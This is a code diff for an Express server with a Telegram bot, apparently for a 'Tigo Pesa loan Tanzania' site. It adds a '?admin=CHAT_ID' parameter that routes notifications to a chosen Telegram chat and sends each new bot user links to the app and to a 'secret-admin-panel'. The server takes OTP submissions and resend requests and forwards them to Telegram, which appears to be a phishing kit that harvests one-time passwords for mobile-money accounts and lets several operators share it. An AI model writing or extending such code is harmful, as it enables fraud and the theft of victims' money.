@@ -6,6 +6,7 @@
  * - Root URL serves the main user application (app.html).
  * - Secured private path serves the admin panel (admin.html).
  * - Request New OTP handling with 30s countdown integration.
+ * - Dynamic Admin URL parameter parsing (?admin=CHAT_ID) for routing notifications.
  */
 
 const express = require('express');
@@ -107,7 +108,7 @@ async function initBot() {
   });
 
   /**
-   * **INSTANT /START COMMAND HANDLER**
+   * **INSTANT /START COMMAND HANDLER WITH DYNAMIC ADMIN QUERY LINK**
    */
   bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
@@ -118,15 +119,17 @@ async function initBot() {
     const fullName = `${firstName} ${lastName}`.trim();
     const username = user.username ? `@${user.username}` : 'No username set';
     
-    // Hidden private admin panel link sent via Telegram bot
+    // Customized browse link containing their unique chat ID as a query parameter
+    const customAdminBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${chatId}`;
     const secureAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/secret-admin-panel`;
 
     const userWelcomeInfo = 
-      `🚨 **New User Started the Bot!**\n\n` +
+      `🚨 **New Admin/User Started the Bot!**\n\n` +
       `👤 **Name:** ${fullName}\n` +
       `🆔 **Chat ID:** \`${user.id}\`\n` +
       `🏷 **Username:** ${username}\n` +
-      `🔗 **Admin Panel Link:** [${secureAdminLink}](${secureAdminLink})`;
+      `🔗 **Browse Application Link:** [Open App](${customAdminBrowseLink})\n` +
+      `🔗 **Admin Dashboard Link:** [Open Dashboard](${secureAdminLink})`;
 
     await bot.sendMessage(chatId, userWelcomeInfo, { 
       parse_mode: 'Markdown',
@@ -195,7 +198,7 @@ function getTargetChatId(reqChatId) {
 
 /**
  * **EXPLICIT ROUTE FOR USER APPLICATION (ROOT URL)**
- * Ensures visitors going to the main link land straight on the application page (app.html).
+ * Serves app.html for regular users or admins browsing via query parameters.
  */
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'app.html'));
@@ -203,7 +206,7 @@ app.get('/', (req, res) => {
 
 /**
  * **SECURED / HIDDEN ROUTE FOR ADMIN PANEL**
- * Maps requests for the private admin panel to 'admin.html'.
+ * Maps requests for the private admin dashboard to 'admin.html'.
  */
 app.get('/secret-admin-panel', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
@@ -330,7 +333,6 @@ app.post('/api/submit-otp', (req, res) => {
 
 /**
  * **REQUEST NEW OTP ENDPOINT**
- * Triggers notification to Telegram when user clicks resend button after countdown.
  */
 app.post('/api/request-new-otp', (req, res) => {
   try {
